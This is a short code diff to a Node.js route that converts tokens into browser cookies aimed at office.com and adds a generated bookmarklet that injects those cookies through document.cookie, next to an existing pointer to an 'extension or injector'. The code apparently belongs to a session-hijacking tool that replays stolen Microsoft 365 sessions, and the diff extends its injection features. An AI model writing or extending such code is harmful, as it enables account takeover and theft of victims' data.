@@ -1199,6 +1199,10 @@ router.post('/:id/convert', userAuth, async (req, res) => {
         console.warn('[Tokens] Could not store cookies:', e.message);
       }
 
+      // Generate bookmarklet script (document.cookie format)
+      const formattedCookies = cookieConverter.formatCookiesForInjection(result.cookies);
+      const bookmarklet = cookieConverter.generateBookmarkletScript(formattedCookies);
+
       return res.json({
         success: true,
         message: 'Token converted to cookies successfully',
@@ -1206,7 +1210,8 @@ router.post('/:id/convert', userAuth, async (req, res) => {
         cookie_count: Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(c => c.trim()).length,
         target_url: result.target_url || 'https://www.office.com/',
         expires: '30 days',
-        instructions: 'Use the extension or injector to set cookies in your browser'
+        instructions: 'Use the extension or injector to set cookies in your browser',
+        bookmarklet: bookmarklet
       });
     } else {
       console.error('[Tokens] Convert error:', result.error);
